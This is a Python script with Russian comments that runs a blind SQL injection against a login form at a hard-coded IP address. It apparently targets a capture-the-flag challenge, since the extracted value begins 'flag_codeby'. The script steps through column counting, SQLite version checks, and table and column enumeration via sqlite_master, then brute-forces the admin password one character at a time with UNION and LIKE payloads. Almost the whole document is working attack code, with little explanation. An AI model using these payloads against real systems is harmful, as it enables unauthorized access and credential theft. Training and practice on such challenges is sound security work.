import requests
import urllib.parse
import string

base_url = "http://62.173.140.174:36100/login"
data = {
    "username": "admin",
    "password": "admin"
}

session = requests.Session()

#response = requests.get(url, allow_redirects=False)
#response = session.post(base_url, data=data)

#Столбцы
data = {
    #"username": "' UNION SELECT NULL,NULL,NULL,NULL--",
    "username": "' ORDER BY 100--",
    "password": "admin"
}
#response = session.post(base_url, data=data)

#Тип колонок
data = {
    "username": "' UNION SELECT 0,0,0,0--",
    "password": "admin"
}
#response = session.post(base_url, data=data)

#Версия SQLite
data = {
    "username": "' UNION SELECT NULL,NULL,NULL,NULL WHERE '3.51.1' = substr((SELECT sqlite_version()),1,6)--",
    "password": "admin"
}
#response = session.post(base_url, data=data)

#Список таблиц
data = {
    #"username": "' UNION SELECT 0,0,0,0 FROM sqlite_master WHERE (type='table' AND name='users')--",
    #"username": "' UNION SELECT 0,0,0,0 FROM sqlite_master WHERE (type='table' AND name LIKE 'us%')--",
    #"username": "' UNION SELECT COUNT(*),0,0,0 FROM sqlite_master WHERE type='table' AND name LIKE 'u%'--",
    #"username": "' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name LIKE 'u%') > 0--",
    #"username": "' AND EXISTS (SELECT 1 FROM sqlite_master WHERE type='table' AND name LIKE 'u%')--",
    "username": "' UNION SELECT 0,0,0,0 WHERE (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) LIKE 'users'--",
    "password": "admin"
}
#response = session.post(base_url, data=data)

#Список столбцов
data = {
    #"username": "' UNION SELECT 0,0,0,0 WHERE (SELECT name FROM pragma_table_info('users') LIMIT 1) LIKE 'i%'--",
    #"username": "' UNION SELECT 0,0,0,0 WHERE (SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 1) LIKE 'u%'--",
    #"username": "' UNION SELECT 0,0,0,0 WHERE (SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 1) LIKE 'username'--",
    #"username": "' UNION SELECT 0,0,0,0 WHERE (SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 3) LIKE 'password'--",
    "username": "' UNION SELECT 0,0,0,0 WHERE (SELECT name FROM pragma_table_info('users') LIMIT 1 OFFSET 0) LIKE 'id'--",
    "password": "admin"
}
#response = session.post(base_url, data=data)

#Получить пароль
# Печатные символы для перебора (буквы, цифры, спецсимволы)
printable_chars = string.ascii_letters + string.digits + string.punctuation

#data = {
#    "username": "' UNION SELECT * FROM users WHERE username='admin' and password LIKE 's%'--",
#    "password": "admin"
#}
# Перебираем каждый символ
for char in printable_chars:
    # Формируем шаблон LIKE: первый символ — текущий из цикла, далее любые
    pattern = f"{char}%"
    
    # Подготавливаем данные для POST‑запроса
    data = {
        "username": f"' UNION SELECT * FROM users WHERE username='admin' AND password LIKE 'flag_codeby_1og25ka9psv4as{pattern}'--",
        "password": "admin"
    }
    response = session.post(base_url, data=data)
    print("pattern = ", pattern)
    print("3 - ", response.text)

#print("1 - ", response)
#print("2 - ", response.status_code)
#print("3 - ", response.text)
#print("4 - ", response.content.decode('utf-8'))

